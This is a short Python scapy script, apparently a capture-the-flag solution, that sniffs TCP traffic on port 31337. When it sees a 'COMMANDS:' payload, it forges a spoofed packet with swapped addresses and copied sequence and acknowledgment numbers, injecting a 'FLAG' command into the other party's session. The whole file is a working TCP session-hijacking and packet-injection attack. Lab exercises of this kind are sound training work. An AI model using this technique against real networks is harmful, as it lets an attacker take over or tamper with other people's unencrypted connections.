from scapy.all import sniff, sendp, Ether, IP, TCP, Raw


# Function to inject the FLAG command
def inject_flag_command(iface, src_ip, dst_ip, src_mac, dst_mac, sport, dport, seq, ack):
    # Create a TCP packet with the FLAG command
    ip_packet = IP(src=src_ip, dst=dst_ip)
    tcp_packet = TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack)
    payload = "FLAG\n"
    packet = Ether(src=src_mac, dst=dst_mac) / ip_packet / tcp_packet / payload
    sendp(packet, iface=iface, verbose=False)


# Callback function to process each captured packet
def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        tcp_layer = packet.getlayer(TCP)
        ip_layer = packet.getlayer(IP)
        payload = packet[Raw].load
        if tcp_layer.sport == 31337 or tcp_layer.dport == 31337:
            print(f"Packet Summary: {packet.summary()}")
            print(f"Payload: {payload}")
            if b"COMMANDS:" in payload:
                print("COMMANDS detected!")
                # Respond using the port from which the packet originated as sport
                inject_flag_command(
                    iface="eth0",
                    src_ip=ip_layer.dst,
                    dst_ip=ip_layer.src,
                    src_mac=packet[Ether].dst,
                    dst_mac=packet[Ether].src,
                    sport=tcp_layer.dport,  # Reflect to their source port
                    dport=tcp_layer.sport,  # Our port
                    seq=tcp_layer.ack,
                    ack=tcp_layer.seq + len(payload)
                )

# Start sniffing on port 31337
def start_sniffing(iface):
    print(f"Starting packet sniffing on interface {iface} for port 31337...")
    sniff(filter="tcp port 31337", iface=iface, prn=packet_callback, store=False)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: sudo python sniffer.py <network_interface>")
        sys.exit(1)

    iface = sys.argv[1]
    start_sniffing(iface)
